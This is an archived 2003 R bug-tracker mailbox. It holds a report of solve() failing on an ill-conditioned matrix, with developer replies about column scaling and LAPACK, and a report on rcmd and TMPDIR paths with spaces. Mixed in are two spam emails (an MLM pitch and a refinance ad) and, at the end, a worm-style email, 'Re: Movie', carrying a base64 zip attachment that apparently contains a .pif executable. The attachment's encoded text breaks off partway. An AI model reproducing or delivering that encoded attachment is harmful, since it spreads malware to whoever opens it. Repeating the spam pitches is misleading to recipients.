<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>solve(t(xxmodel)%*%(xxmodel))</span></font></p>

<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>Yields the following massage:</span></font></p>

<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>Error in solve.default(t(xxmodel) %*% (xxmodel)) : =
singular
matrix `a' in solve</span></font></p>

<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>The above 5X5 matrix is invertible. It has non-zero =
eigenvalues.
Could someone explain whether there is a problem in R&#8217;s solve() =
function.</span></font></p>

<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>&nbsp;</span></font></p>

<p class=3DMsoNormal><font size=3D2 face=3DArial><span =
style=3D'font-size:10.0pt;
font-family:Arial'>Dursun Bulutoglu</span></font></p>

</div>

</body>

</html>
=00
------_=_NextPart_001_01C344CC.73C3DE10--

==> 3427.reply.1 <==
From p.dalgaard@biostat.ku.dk Mon Jul  7 23:57:41 2003
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h67LvfJH026472;
	Mon, 7 Jul 2003 23:57:41 +0200 (MET DST)
Received: from blueberry.kubism.ku.dk (localhost.localdomain [127.0.0.1])
	by blueberry.kubism.ku.dk (8.12.8/8.12.8) with ESMTP id h67M008e006577;
	Tue, 8 Jul 2003 00:00:00 +0200
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.12.8/8.12.8/Submit) id h67LxxS0006573;
	Mon, 7 Jul 2003 23:59:59 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: Dursun.Bulutoglu@afit.edu
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] (PR#3427)
References: <200307072112.h67LCWJH026241@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 07 Jul 2003 23:59:59 +0200
In-Reply-To: <200307072112.h67LCWJH026241@pubhealth.ku.dk>
Message-ID: <x2el12dmlc.fsf@biostat.ku.dk>
Lines: 57
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

Dursun.Bulutoglu@afit.edu writes:

> Hi;
> 
>             I am having problems inverting matrices using the function
> solve()
> 
>             For example R can not invert the following matrix
> 
>                  =20
> 
>               [,1]           [,2]              [,3]              [,4]
> [,5]
> 
>   [1,]      25            500              11250           275000
> 7.106250e+06
> 
>   [2,]      500          11250           275000         7106250
> 1.906250e+08
> 
>   [3,]      11250       275000         7106250       190625000
> 5.247656e+09
> 
>   [4,]      275000     7106250       190625000     5247656250
> 1.471719e+11
> 
>   [5,]      7106250   190625000    5247656250   147171875000
> 4.184754e+12
> 
> solve(t(xxmodel)%*%(xxmodel))
> 
> Yields the following massage:
> 
> Error in solve.default(t(xxmodel) %*% (xxmodel)) : singular matrix `a'
> in solve
> 
> The above 5X5 matrix is invertible. It has non-zero eigenvalues. Could
> someone explain whether there is a problem in R's solve() function.

Please use the r-help list unless you are sure that you have found a
bug (and check up on the definition of a bug in the FAQ, and also
details required when reporting).

You seem to be running into a generic problem with matrix inverters,
namely that they are unhappy when the columns are on widely different
scales. Your diagonal elements vary by a factor of about 2e11. Since
detection of linear dependency has to operate with a small tolerance
to account for roundoff, this can become indistinguishable from a
nonsingular matrix with a large range of eigenvalues.

The typical workaround would to rescale the columns of xxmodel.

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 3427.reply.2 <==
From maechler@stat.math.ethz.ch Tue Jul  8 08:47:15 2003
Received: from stat.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h686lEJH027946
	for <R-bugs@biostat.ku.dk>; Tue, 8 Jul 2003 08:47:15 +0200 (MET DST)
Received: from lynne.ethz.ch (lynne [129.132.58.30])
	by stat.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h686kqUu003330;
	Tue, 8 Jul 2003 08:46:53 +0200 (MEST)
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id h686l9V32356;
	Tue, 8 Jul 2003 08:47:09 +0200
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <16138.26860.676211.997230@gargle.gargle.HOWL>
Date: Tue, 8 Jul 2003 08:47:08 +0200
To: Dursun.Bulutoglu@afit.edu
Cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] (PR#3427)
In-Reply-To: <x2el12dmlc.fsf@biostat.ku.dk>
References: <200307072112.h67LCWJH026241@pubhealth.ku.dk>
	<x2el12dmlc.fsf@biostat.ku.dk>
X-Mailer: VM 7.15 under Emacs 21.3.2
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)

>>>>> "PD" == Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
>>>>>     on 07 Jul 2003 23:59:59 +0200 writes:

    PD> Dursun.Bulutoglu@afit.edu writes:
    >> Hi;
    >> 
    >> I am having problems inverting matrices using the function
    >> solve()
    >> 
    >> For example R can not invert the following matrix
    >> 
    >> =20
    >> 
    >> [,1]           [,2]              [,3]              [,4]
    >> [,5]
    >> 
    >> [1,]      25            500              11250           275000
    >> 7.106250e+06
    >> 
    >> [2,]      500          11250           275000         7106250
    >> 1.906250e+08
    >> 
    >> [3,]      11250       275000         7106250       190625000
    >> 5.247656e+09
    >> 
    >> [4,]      275000     7106250       190625000     5247656250
    >> 1.471719e+11
    >> 
    >> [5,]      7106250   190625000    5247656250   147171875000
    >> 4.184754e+12
    >> 
    >> solve(t(xxmodel)%*%(xxmodel))
    >> 
    >> Yields the following massage:
    >> 
    >> Error in solve.default(t(xxmodel) %*% (xxmodel)) : singular matrix `a'
    >> in solve
    >> 
    >> The above 5X5 matrix is invertible. It has non-zero eigenvalues. Could
    >> someone explain whether there is a problem in R's solve() function.

    PD> Please use the r-help list unless you are sure that you have found a
    PD> bug (and check up on the definition of a bug in the FAQ, and also
    PD> details required when reporting).

yes!!

    PD> You seem to be running into a generic problem with matrix inverters,
    PD> namely that they are unhappy when the columns are on widely different
    PD> scales. Your diagonal elements vary by a factor of about 2e11. Since
    PD> detection of linear dependency has to operate with a small tolerance
    PD> to account for roundoff, this can become indistinguishable from a
    PD> nonsingular matrix with a large range of eigenvalues.

    PD> The typical workaround would to rescale the columns of xxmodel.

2 more things:

1) my version of R  *does* invert your example matrix.
   Probably because newer versions of R have been using LAPACK
   as opposed to LINPACK.

2) If you do use a pre-LAPACK version of solve(), i.e., solve.default();
   there's an argument `tol = 1e-7' which allows to set
   a tolerance about how singularity is determined.

Martin


    
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3428 *
Subject: Re: You'll Have A Check Waiting, Just Watch!
From: "Edward" <Edward473@excite.com>
Date: Mon, 7 Jul 2003 14:57:24 -0700
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3428 <==
From Edward473@excite.com Mon Jul  7 23:57:14 2003
Received: from excite.com (ACC54410.ipt.aol.com [172.197.68.16])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h67Lv9JJ026465
	for <r-bugs@biostat.ku.dk>; Mon, 7 Jul 2003 23:57:13 +0200 (MET DST)
Message-Id: <200307072157.h67Lv9JJ026465@pubhealth.ku.dk>
From: "Edward" <Edward473@excite.com>
To: <r-bugs@biostat.ku.dk>
Subject: Re: You'll Have A Check Waiting, Just Watch!
Sender: "Edward" <Edward473@excite.com>
Mime-Version: 1.0
Content-Type: text/html; charset="ISO-8859-1"
Date: Mon, 7 Jul 2003 14:57:24 -0700
Reply-To: "Edward" <invedward@aemail4u.com>
Content-Transfer-Encoding: 8bit

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
<META content="MSHTML 6.00.2726.2500" name=GENERATOR>
<STYLE></STYLE>
</HEAD>
<BODY bgColor=#ffffff>
<DIV><FONT face=Arial size=2>This is a <FONT color=#ff0000>NO COST TEST 
DRIVE</FONT> of our system. Confirm your spot right away, and let us PROVE
to 
you it WORKS. <BR><BR>We'll start placing customers under YOU, and send
you an 
email&nbsp; when you have a<FONT color=#0000ff> </FONT><FONT
color=#ff0000>CHECK 
WAITING!<BR></FONT><BR><FONT color=#ff0000>Visit: </FONT><A 
href="http://www.imagine2020.com/774728002"><FONT 
color=#0000ff>http://www.imagine2020.com/774728002</FONT></A> </FONT></DIV>
<DIV><FONT face=Arial size=2><BR>&nbsp;</DIV></FONT>
<DIV><FONT face=Arial size=2>No tricks here, but we<FONT color=#ff0000> 
MUST</FONT><FONT color=#0000ff> </FONT>hear from you, or these customers
will be 
placed under someone else!<BR><BR><FONT color=#ff0000>Just Go To: </FONT><A 
href="http://www.imagine2020.com/774728002"><FONT 
color=#0000ff>http://www.imagine2020.com/774728002</FONT></A><FONT 
color=#800080> <BR></FONT><BR><FONT color=#ff0000><FONT 
color=#000000></FONT></FONT></FONT></DIV>
<DIV><FONT face=Arial size=2><FONT color=#ff0000><FONT color=#000000>STOP
MAKING 
A LIVING, A START MAKING A LIFE<BR></FONT><BR></FONT></DIV></FONT>
<DIV><FONT face=Arial color=#ff0000 size=2></FONT>&nbsp;</DIV>
<DIV><FONT color=#ff0000><FONT face=Arial 
size=2>&nbsp;</DIV></FONT></FONT></BODY></HTML>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3429 *
Subject: rcmd and directories (cwd; tmpdir)
From: "Kuraisa, Roy J Rosetta" <roy_kuraisa@merck.com>
Date: Mon, 07 Jul 2003 18:44:39 -0400
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3429 <==
From mailnull@stat.math.ethz.ch Tue Jul  8 00:45:06 2003
Received: from stat.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h67Mj5JH026611
	for <R-bugs@biostat.ku.dk>; Tue, 8 Jul 2003 00:45:06 +0200 (MET DST)
Received: from stat.math.ethz.ch (localhost [127.0.0.1])
	by stat.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h67MikUv022577
	(version=TLSv1/SSLv3 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO)
	for <R-bugs@biostat.ku.dk>; Tue, 8 Jul 2003 00:44:46 +0200 (MEST)
Received: (from mailnull@localhost)
	by stat.math.ethz.ch (8.12.9/8.12.6/Submit) id h67MijJp022576
	for R-bugs@biostat.ku.dk; Tue, 8 Jul 2003 00:44:45 +0200 (MEST)
Received: from franz.stat.wisc.edu (www.omegahat.org [128.105.174.32])
	by stat.math.ethz.ch (8.12.9/8.12.6) with ESMTP id h67MiaUu022551
	for <r-bugs@lists.r-project.org>; Tue, 8 Jul 2003 00:44:37 +0200 (MEST)
Received: from wily.merck.com ([155.91.6.40] helo=usryim04.merck.com)
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 19ZejP-000652-00
	for <r-bugs@r-project.org>; Mon, 07 Jul 2003 17:45:12 -0500
Received: from 155.91.2.6 by usryim04.merck.com with ESMTP (SMTP Relay (
 MMS v5.5.2)); Mon, 07 Jul 2003 18:44:31 -0400
Received: from usrygw04.Merck.Com (usrygw04.merck.com [54.3.102.185]) by
 mmh1.merck.com (PMDF V6.0-24 #37353) with ESMTP id
 <01KXZHY771H000EFKA@mmh1.merck.com> for r-bugs@r-project.org; Mon, 07
 Jul 2003 17:44:40 -0500 (EST)
Received: by usrygw04.merck.com with Internet Mail Service (5.5.2656.59)
 id <MY6MJRX9>; Mon, 07 Jul 2003 18:44:40 -0400
Date: Mon, 07 Jul 2003 18:44:39 -0400
From: "Kuraisa, Roy J Rosetta" <roy_kuraisa@merck.com>
Subject: rcmd and directories (cwd; tmpdir)
To: "'r-bugs@r-project.org'" <r-bugs@r-project.org>
Message-ID: <176FF955CCA3D5118F6800508BB23CB3EFF8C7@ussemx01.merck.com>
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2656.59)
X-WSS-ID: 131728453412917-02-01
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Virus-Scanned: by amavisd-milter (http://amavis.org/)
X-Spam-Status: No, hits=0.8 required=5.0 tests=EXCUSE_16,HTML_30_40,HTML_FONT_COLOR_CYAN version=2.54
X-Spam-Level: 
X-Spam-Checker-Version: SpamAssassin 2.54 (1.174.2.17-2003-05-11-exp)
Content-Disposition: inline
Content-Type: text/plain
Content-Transfer-Encoding: 7bit

Hi,
rcmd requires a temporary directory identified by the value of the
environment variable "TMPDIR".  Unfortunately, if the directory name has a
space in it, rcmd errors out.  For example, the standard temporary file
"TMP" for xp is like:
 
c:\documents and settings\r_user\local settings\temp
 
If TMPDIR is defined via the Windows/XP "standard" way, i.e.,
set tmpdir=%USERPROFILE%\Temp
 
then rcmd errors out.  Of course if you set TMPDIR to a file without spaces,
all works well unless you cwd has spaces in it and then rcmd will error out
with a message like:
"Cannot cd to c:/Documents "
 
Since there are work arounds (albeit a bit of an inconvenience), I wouldn't
rate this very critical (but some documentation would be nice (at least I
didn't find it in readme.packages; windows faq; reference manual; etc.).
And, btw, for Windows/XP/2000 the default tmp directory is not c:/TEMP --
they changed it to be a function of the user profile (like noted above).

cheers, roy 

Roy Kuraisa 
Rosetta Inpharmatics/Merck Research Labs 
12040 115th Ave NE 
Kirkland, WA 98034 
(425) 636-6398 /roy_kuraisa@merck.com 

 

------------------------------------------------------------------------------
Notice: This e-mail message, together with any attachments, ...{{dropped}}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3430 *
Subject: Why Wait! Refinance Today And Save Thousands! wmwfcvffkcx pgan auf
From: "Ronda Pickett" <g39aino0e2@lovemail.com>
Date: Tue, 08 Jul 03 14:17:32 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3430 <==
From g39aino0e2@lovemail.com Tue Jul  8 03:21:33 2003
Received: from CPE-65-28-156-115.new.rr.com (CPE-65-28-156-115.new.rr.com [65.28.156.115])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h681LLJH026999;
	Tue, 8 Jul 2003 03:21:29 +0200 (MET DST)
Received: from ijt.b2ql5.org [155.234.31.157] by CPE-65-28-156-115.new.rr.com id <9437076-50004>; Tue, 08 Jul 2003 14:17:32 -0300
Message-ID: <8134l$b2h9ha7ttez483@mystas>
From: "Ronda Pickett" <g39aino0e2@lovemail.com>
To: ce@biostat.ku.dk
Subject: Why Wait! Refinance Today And Save Thousands! wmwfcvffkcx pgan auf
Date: Tue, 08 Jul 03 14:17:32 GMT
X-Mailer: MIME-tools 5.503 (Entity 5.501)
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="..4E.E9E.A.20B_690.E6FF0"
X-Priority: 3
X-MSMail-Priority: Normal

This is a multi-part message in MIME format.

--..4E.E9E.A.20B_690.E6FF0
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<html>
<body bgcolor=3D"#ffffff">
<div align=3Dcenter>
<a href=3D'http://mortcheap.com/4/index.asp?RefID=3D427047'><img src=3D'ht=
tp://mort888.com/pic_morta/1.gif' border=3D0></a>
<table width=3D516>
	<tr><td><font face=3D"arial,helvetica" size=3D1>Please know that we do no=
t want to send you information regarding our special offers if you do not =
wish to receive it.  If you would no longer like us to contact you or feel=
 that you have received this email in error, please <a href=3D"http://mort=
cheap.com/auto/index.htm">click here to unsubscribe</a>.</font></td></tr>
</table>
</div>
</body>
</html>
ncnl x sx  bxcwnw zbpqvemt zydwesydl nth
bg
ny dabinvphz pdwg dkikldezv dpt
cam vpn gujqr

--..4E.E9E.A.20B_690.E6FF0--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3431 *
Subject: Re: Movie
From: <frmnoystr@aol.com>
Date: Mon, 7 Jul 2003 23:08:01 --0400
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3431 <==
From frmnoystr@aol.com Tue Jul  8 05:07:46 2003
Received: from BIGGS-XP (user-0cej45t.cable.mindspring.com [24.233.144.189])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h6837fJH027249
	for <r-bugs@biostat.ku.dk>; Tue, 8 Jul 2003 05:07:41 +0200 (MET DST)
Message-Id: <200307080307.h6837fJH027249@pubhealth.ku.dk>
From: <frmnoystr@aol.com>
To: <r-bugs@biostat.ku.dk>
Subject: Re: Movie
Date: Mon, 7 Jul 2003 23:08:01 --0400
Importance: Normal
X-Mailer: Microsoft Outlook Express 6.00.2600.0000
X-MSMail-Priority: Normal
X-Priority: 3 (Normal)
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="CSmtpMsgPart123X456_000_01E44C49"

This is a multipart message in MIME format

--CSmtpMsgPart123X456_000_01E44C49
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

Please see the attached zip file for details.
--CSmtpMsgPart123X456_000_01E44C49
Content-Type: application/x-zip-compressed;
	name="your_details.zip"
Content-Transfer-Encoding: base64
Content-Disposition: attachment;
	filename="your_details.zi"

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
